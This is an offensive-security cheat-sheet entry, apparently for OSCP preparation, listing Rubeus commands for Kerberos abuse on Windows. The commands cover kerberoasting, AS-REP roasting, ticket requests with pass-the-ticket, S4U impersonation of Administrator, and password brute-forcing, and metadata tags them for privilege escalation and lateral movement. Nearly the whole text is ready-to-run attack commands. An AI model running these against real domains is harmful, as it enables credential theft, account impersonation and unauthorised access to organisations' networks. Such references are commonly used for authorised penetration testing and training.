---
variants:
  - label: kerberoast
    command: |
      Rubeus.exe kerberoast /domain:$DOMAIN /outfile:hashes.kerberoast
  - label: asktgt
    command: |
      Rubeus.exe asktgt /user:$USER /password:$PASSWORD /domain:$DOMAIN /ptt
  - label: asreproast
    command: |
      Rubeus.exe asreproast /domain:$DOMAIN /format:hashcat /outfile:asrep-hashes.txt
  - label: s4u
    command: |
      Rubeus.exe s4u /user:$USER /rc4:$HASH /impersonateuser:Administrator /msdsspn:cifs/$IP /domain:$DOMAIN /ptt
  - label: brute
    command: |
      Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:$DOMAIN /outfile:bruteforce.txt
description: Kerberos abuse on Windows with Rubeus, by action.
os: [Windows]
category: [oscp]
have: [hash]
service: [Kerberos]
phase: [PrivEsc, LateralMovement, InitialAccess]
references:
  - https://github.com/GhostPack/Rubeus
---
